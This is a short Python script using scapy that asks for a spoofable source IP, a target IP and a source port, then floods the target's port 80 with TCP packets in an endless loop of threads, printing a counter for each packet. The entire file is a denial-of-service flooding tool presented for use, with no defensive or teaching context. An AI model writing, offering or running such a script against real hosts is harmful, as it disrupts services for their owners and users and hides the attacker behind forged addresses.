from scapy.all import *
from threading import Thread
from itertools import count


source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))



IP1 = scapy.all.IP(src= source_IP, dst=target_IP)
TCP1 = scapy.all.TCP(sport=source_port, dport=80)
pkt = IP1 / TCP1
for i in count(0): # Infinite loop; Runs until you abort the script.
    threadObj= Thread(target=send,args=pkt)
    threadObj.start()
    print("Packet {} sent.".format(i))